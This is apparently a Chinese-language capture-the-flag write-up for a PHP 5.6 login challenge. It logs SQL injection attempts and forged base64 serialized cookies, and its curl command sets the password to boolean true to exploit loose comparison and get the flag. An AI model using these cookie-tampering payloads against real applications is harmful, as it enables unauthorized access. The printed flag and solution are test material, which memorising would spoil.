# xben-014-24 · 探索记录

对应题解：[`xben-014-24.md`](./xben-014-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.25 (Debian)`，`X-Powered-By: PHP/5.6.40`。
页面标题 `AUTH 04`（Springfield / Simpsons 主题）。

```html
<form action="index.php" method="POST">
  Username: <input type="text" name="username"><br>
  Password: <input type="password" name="password"><br>
</form>
```

## 第一阶段：登录行为

先按常规思路试弱口令和注入，结果都一样——**没有"失败"这个状态**：

| 输入 | 结果 |
| --- | --- |
| `admin/admin` | 302 + `Set-Cookie: creds=…` |
| `zzz/zzz` | 302 + 同样的 cookie 结构 |
| `admin/wrongpass` | 302 + cookie |
| `admin'-- -` / `' OR 1=1-- -` | 同样 302 + cookie |

```text
Set-Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjt9
```

base64 解码：

```text
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
```

**判据**：登录没有校验，只是把表单字段序列化进 cookie。真正的判定在 cookie 解析那一侧。

## 第二阶段：带着 cookie 访问

```html
User: admin
<h3>Oh Sorry but...you are not the admin :(</h3>
```

用 `admin` 也"不是 admin"。于是有三个可能：

1. 判定用 `password`（不是用户名）；
2. 判定还要额外字段（`is_admin`、`role`）；
3. 判定用了对象/类型相关的比较。

## 第三阶段：用 cookie 变体做对照实验

cookie 完全可控，直接构造序列化字符串（base64 后放进 `Cookie: creds=`）：

| 构造 | 结果 |
| --- | --- |
| `a:2:{…"username";s:5:"admin";…"password";s:5:"admin";}` | 不是 admin |
| `a:1:{…"username";s:5:"admin";}` | 不是 admin |
| 加 `"is_admin";b:1` | 不是 admin |
| 加 `"role";s:5:"admin"` | 不是 admin |
| `"username";s:5:"admin";"admin";b:1` | 不是 admin |
| **`"password";b:1`** | **`Congratulations, here is the flag: flag{ad…}`** |

结论：判定条件读的是 `password`，而且用的是**松散比较**
（`true == "任意非空字符串"` 在 PHP 5.x 里恒为真）。

## 第四阶段：拿 flag

```bash
cookie=$(printf '%s' 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64 -w0)
curl -H "Cookie: creds=$cookie" http://$T/index.php
```

```html
Congratulations, here is the flag: flag{adaf8d85-dc7b-4e1a-99ce-cb22a5f563a7}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| SQL 注入（`admin'-- -`、`' OR 1=1-- -`） | 全部 302 + cookie | 登录根本不查库 |
| 弱口令（`admin/admin`、`homer/homer`） | 都能"登录" | 没有认证逻辑，属于假象 |
| 只用 `username` 字段 | 不是 admin | 判定不看 username 单独值 |
| 追加 `is_admin=true` | 不是 admin | 该字段被忽略 |
| 追加 `role=admin` | 不是 admin | 同上 |
| 把用户名改成别的（`homer`） | 不是 admin | 打印的是 cookie 里的 username |

## 这次真正的收获

1. **"随便什么凭据都能登录"说明认证在别处。** 我用 4 组凭据验证了这一点，
   然后把注意力从登录表单转到 cookie——这是本题最关键的一步。
2. **`a:2:{s:8:…}` 就是 PHP 序列化，base64 一解开结构全暴露。**
   能改字段、能改类型，这就是"不安全反序列化"的标准操作空间。
3. **对照实验比猜实现快。** 6 个 cookie 变体（加 `is_admin`、加 `role`、改 `password`
   类型）一次就定位到 `password` 是判定字段；如果只凭"admin 不是 admin"去猜，
   很容易在用户名/多余字段上绕圈。
4. **PHP 5.x + `==` = 类型混淆。** `b:1`（`true`）能通过"密码"检查，
   是因为松散比较把 `true` 和任意非空字符串视为相等。
   同类还有 `"0e…" == "0e…"`（magic hash）和 `0 == "admin"`。
5. **这个漏洞需要两个条件同时成立**：cookie 由客户端控制（可篡改序列化数据）
   ＋ 服务端用松散比较。只改其中一个都不成立，所以测试清单里应当
   "改类型"和"加字段"两条都试。
